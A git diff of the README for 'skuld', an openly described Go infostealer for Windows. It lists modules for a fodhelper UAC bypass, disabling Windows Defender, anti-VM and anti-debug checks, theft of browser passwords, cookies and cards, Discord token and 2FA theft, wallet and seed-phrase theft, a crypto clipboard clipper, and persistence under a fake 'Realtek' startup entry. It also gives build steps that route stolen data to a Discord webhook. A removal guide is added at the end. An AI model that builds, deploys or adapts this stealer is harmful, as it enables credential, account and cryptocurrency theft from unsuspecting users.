@@ -37,7 +37,7 @@
     </li>
     <li><a href="#usage">Usage</a></li>
     <li><a href="#preview">Preview</a></li>
-    <li><a href="#roadmap">Roadmap</a></li>
+    <li><a href="#remove">Remove</a></li>
     <li><a href="#contributing">Contributing</a></li>
     <li><a href="#license">License</a></li>
     <li><a href="#contact">Contact</a></li>
@@ -47,40 +47,41 @@
 
 ## About the project
 
-This proof of concept project demonstrates a "Discord-oriented" stealer implemented in Go, a language not commonly utilized for such purposes on GitHub. The malware is designed to operate on Windows systems and employs a method involving privilege escalation, specifically leveraging the well-known Fodhelper technique. By elevating privileges, the malware gains access to sensitive user data stored in all user sessions on every disk
+This proof of concept project demonstrates a "Discord-oriented" stealer implemented in Go. The malware operates on Windows systems and use fodhelper.exe technique for privileges elevation. By elevating privileges, the malware gains access to all user sessions on every disk
 
 ### Features:
 
-- **UAC Bypass:** Grants privileges to steal user data from others users. 🕵️‍♂️
-- **Console hiding:** Module to hide the console. 🕶️
-- **Fake Error Simulation:** Trick user into believing the program closed due to an error. 🎭
-- **Startup Persistence:** Ensures the program runs at system startup. 🚀
-- **Anti-debugging Measures:** Detects and exits when running in virtual machines (VMs). 🔍
-- **Antivirus Evasion:** Attempts to disable Windows Defender and block access to antivirus websites. 🦠
-- **System Information Retrieval:** Gathers CPU, GPU, RAM, IP, location, saved Wi-Fi networks, and more. 🖥️
-- **Chromium-based Browsers Data Theft:** Steals logins, cookies, credit cards, history, and download lists from 37 Chromium-based browsers.
-- **Gecko Browsers Data Theft:** Steals logins, cookies, history, and download lists from 10 Gecko browsers. 🦊
-- **Common Files Theft:** Steals sensitive files from common locations. 🗂️
-- **Discord Backup Codes Theft:** Captures Discord Two-Factor Authentication (2FA) backup codes. 🔑
-- **Wallet Data Theft:** Steals data from 10 local wallets and 55 wallet extensions. 💰
-- **Discord Tokens Theft:** Extracts tokens from 4 Discord applications, Chromium-based browsers, and Gecko browsers.
-- **Games Data Theft:** Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions. 🎮
-- **[Discord Injection:](https://github.com/hackirby/discord-injection)**
+- [antidebug](https://github.com/hackirby/skuld/blob/main/modules/antidebug/antidebug.go): Terminates debugging tools.
+- [antivirus](https://github.com/hackirby/skuld/blob/main/modules/antivirus/antivirus.go): Disables Windows Defender and blocks access to antivirus websites.
+- [antivm](https://github.com/hackirby/skuld/blob/main/modules/antivm/antivm.go): Detects and exits when running in virtual machines (VMs).
+- [browsers](https://github.com/hackirby/skuld/blob/main/modules/browsers/browsers.go):
+  - Steals logins, cookies, credit cards, history, and download lists from 37 Chromium-based browsers.
+  - Steals logins, cookies, history, and download lists from 10 Gecko browsers.
+- [clipper](https://github.com/hackirby/skuld/blob/main/modules/clipper/clipper.go): Replaces the user's clipboard content with a specified crypto address when copying another address.
+- [commonfiles](https://github.com/hackirby/skuld/tree/main/modules/commonfiles/commonfiles.go): Steals sensitive files from common locations.
+- [discodes](https://github.com/hackirby/skuld/blob/main/modules/discodes/discodes.go): Captures Discord Two-Factor Authentication (2FA) backup codes.
+- [discordinjection](https://github.com/hackirby/skuld/blob/main/modules/discordinjection/injection.go):
   - Intercepts login, register, and 2FA login requests.
   - Captures backup codes requests.
   - Monitors email/password change requests.
   - Intercepts credit card/PayPal addition requests.
   - Blocks the use of QR codes for login.
   - Prevents requests to view devices.
-- **[Crypto Wallets Injection:](https://github.com/hackirby/wallets-injection)**
-  - Captures mnemonic phrases.
-  - Captures passwords.
-- **Crypto Clipper:** Replaces the user's clipboard content with a specified crypto address when copying another address. 📋
+- [fakerror](https://github.com/hackirby/skuld/blob/main/modules/fakeerror/fakeerror.go): Trick user into believing the program closed due to an error.
+- [games](https://github.com/hackirby/skuld/blob/main/modules/games/games.go): Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions.
+- [hideconsole](https://github.com/hackirby/skuld/blob/main/modules/hideconsole/hideconsole.go): Module to hide the console.
+- [startup](https://github.com/hackirby/skuld/blob/main/modules/startup/startup.go): Ensures the program runs at system startup.
+- [system](https://github.com/hackirby/skuld/blob/main/modules/system/system.go): Gathers CPU, GPU, RAM, IP, location, saved Wi-Fi networks, and more.
+- [tokens](https://github.com/hackirby/skuld/blob/main/modules/tokens/tokens.go): Extracts tokens from 4 Discord applications, Chromium-based browsers, and Gecko browsers.
+- [uacbypass](https://github.com/hackirby/skuld/blob/main/modules/uacbypass/bypass.go): Grants privileges to steal user data from others users.
+- [wallets](https://github.com/hackirby/skuld/blob/main/modules/wallets/wallets.go): Steals data from 10 local wallets and 55 wallet extensions.
+- [walletsinjection](https://github.com/hackirby/skuld/blob/main/modules/walletsinjection/walletsinjection.go): Captures mnemonic phrases and passwords from 2 crypto wallets.
 
 ## Getting started
 
 ### Prerequisites
 
+* [Git](https://git-scm.com/downloads)
 * [The Go Programming Language](https://go.dev/dl/)
 
 ### Installation
@@ -103,22 +104,21 @@ You can use the Project template:
 
 - Open `main.go` and edit config with your Discord webhook and your crypto addresses
 
-![](.github/assets/config.png)
 
-- Build the template: (You can reduce binary size by using `-s -w` and hide the console by using `-H=windowsgui` ldflags)
+<img src=".github/assets/config.png">
+
+- Build the template: (reduce binary size by using `-s -w` and hide the console by using `-H=windowsgui` ldflags)
 
 ```bash
 go build -ldflags "-s -w -H=windowsgui"
 ```
 
 
-but you can also use skuld in your own Go code. Just import the desired module like this:
+- You can also use skuld in your own Go code. Just import the desired module like this:
 ```go
 package main
 
-import (
-  "github.com/hackirby/skuld/modules/hideconsole"
-)
+import "github.com/hackirby/skuld/modules/hideconsole"
 
 func main() {
   hideconsole.Run()
@@ -126,23 +126,36 @@ func main() {
 ```
 
 ## Preview
-![](.github/assets/system.png)
-![](.github/assets/browsers.png)
-![](.github/assets/token.png)
-![](.github/assets/discodes.png)
-![](.github/assets/wallets.png)
-![](.github/assets/games.png)
-![](.github/assets/codes.png)
 
-## Roadmap
-- [x] Upload project
-- [ ] Add Webcam screenshots 
-- [ ] Refactor code
-- [ ] Add a Crypto Miner
-- [ ] Add a Keylogger
-- [ ] Add VPNs, Messengers stealer
+| System Information | Browsers Data | Discord Tokens | discord backup codes.txt | Crypto Wallets | Games Data | Sniffed Backup Codes |
+| --- | --- | --- | --- | --- | --- | --- |
+| ![](.github/assets/system.png) | ![](.github/assets/browsers.png) | ![](.github/assets/token.png) | ![](.github/assets/discodes.png) | ![](.github/assets/wallets.png) | ![](.github/assets/games.png) | ![](.github/assets/codes.png) |
 
-I am considering working on these features, but I'm not completely certain yet. However, please feel free to open a pull request to add these features. 
+## Remove
+
+This guide will help you removing skuld from your system
+
+1. Open powershell as administrator
+
+2. Kill processes that could be skuld
+
+```bash
+taskkill /f /t /im skuld.exe
+taskkill /f /t /im SecurityHealthSystray.exe
+```
+
+(use `tasklist` to list all running processes, skuld.exe and SecurityHealthSystray.exe are the default names)
+
+3. Remove skuld from startup
+```bash
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f
+```
+
+(Realtek HD Audio Universal Service is the default name)
+
+4. Enable Windows defender:
+
+You can do it by running this [.bat script](https://github.com/TairikuOokami/Windows/blob/main/Microsoft%20Defender%20Enable.bat) (I'm not the developer behind it, make sure the file does not contain malware)
 
 ## Contributing
 Contributions to this project are welcome! Feel free to open issues, submit pull requests, or suggest improvements. Make sure to follow the [Contributing Guidelines](https://github.com/hackirby/skuld/blob/main/CONTRIBUTING.md)
